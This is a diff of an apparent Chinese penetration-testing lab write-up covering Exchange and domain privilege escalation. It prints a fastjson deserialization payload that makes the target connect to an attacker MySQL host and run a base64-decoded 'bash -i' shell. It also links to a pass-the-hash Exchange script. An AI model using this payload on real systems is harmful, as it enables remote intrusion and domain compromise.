@@ -218,7 +218,9 @@
 <p>三、Exchange与Dcsync</p>
 <p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83">域渗透——使用Exchange服务器中特定的ACL实现域提权</a></p>
 <p>四、Exchange邮件导出</p>
-<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><table>
+<p>脚本：<a target="_blank" rel="noopener" href="https://github.com/Jumbo-WJB/PTH_Exchange">https://github.com/Jumbo-WJB/PTH_Exchange</a></p>
+<hr>
+<table>
 <thead>
 <tr>
 <th>172.22.3.12</th>
@@ -242,7 +244,7 @@
 <td>域控制器</td>
 </tr>
 </tbody></table>
-<p>后台fastjson反序列化打jdbc，cc6链</p>
+<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><p>后台fastjson反序列化打jdbc，cc6链</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;name&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">		&quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,</span><br><span class="line">		&quot;hostToConnectTo&quot;: &quot;vps&quot;,</span><br><span class="line">		&quot;portToConnectTo&quot;: 3306,</span><br><span class="line">		&quot;info&quot;: &#123;</span><br><span class="line">			&quot;user&quot;: &quot;deser_CC31_bash -c &#123;echo,...&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;,</span><br><span class="line">			&quot;password&quot;: &quot;pass&quot;,</span><br><span class="line">			&quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">			&quot;autoDeserialize&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;NUM_HOSTS&quot;: &quot;1&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>fscan扫描结果</p>
